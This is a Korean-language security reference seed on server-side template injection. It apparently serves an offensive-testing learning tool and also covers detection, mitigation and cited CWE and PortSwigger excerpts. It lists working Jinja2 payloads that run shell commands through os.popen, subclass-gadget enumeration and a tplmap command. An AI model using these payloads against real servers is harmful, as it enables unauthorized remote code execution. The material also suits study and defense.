# 학습 시드(심화): ssti

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn ssti`. P1: 머신별 라이트업 미참조.

## 개요
서버측 템플릿 주입: 입력이 템플릿 엔진에 평가되어 RCE. Jinja2·Twig·FreeMarker·Velocity. CWE-1336.

## 핵심 기법 · 열거
- 탐지: {{7*7}}→49, ${7*7}, #{7*7} 폴리글랏으로 엔진 식별
- Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}} → Popen
- Twig/FreeMarker: 내장 객체로 명령실행
- 샌드박스 탈출(파이썬 MRO·리플렉션)

## 표준 도구 · 명령
```
{{7*7}}                                        # 탐지
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}  # Jinja2
{{''.__class__.__mro__[1].__subclasses__()}}  # 가젯 탐색
tplmap -u '<url>?name=*'                        # 자동화
```

## 블루팀 탐지
입력에 {{·${·#{ 템플릿 구문. 웹프로세스의 비정상 자식(sh/id). 템플릿 에러 스택.

## 완화
로직리스 템플릿·사용자입력 템플릿화 금지·샌드박스·허용목록 변수.

- 출처(검증): https://portswigger.net/web-security/server-side-template-injection

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### CWE-1336 Template Engine Injection
- 출처: https://cwe.mitre.org/data/definitions/1336.html
- 승격일: 2026-10-07
- 요약: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine — The product uses a template engine to insert or process externally-influenced input, but it does not neutralize or incorrectly neutralizes special elements or syntax that can be interpreted as template expressions or other code directives when processed by the engine. Extended Description Many web applications use template engines that allow developers to insert externally-influenced values into free text or messag

### PortSwigger SSTI
- 출처: https://portswigger.net/web-security/server-side-template-injection
- 승격일: 2026-10-07
- 요약: Server-side template injection This technique was first documented by PortSwigger Research in the conference presentation Server-Side Template Injection: RCE for the Modern Web App. In this section, we'll discuss what server-side template injection is and outline the basic methodology for exploiting server-side template injection vulnerabilities. We'll also suggest ways of making sure that your own use of templates doesn't expose you to server-side template injection. Labs If you're already fami
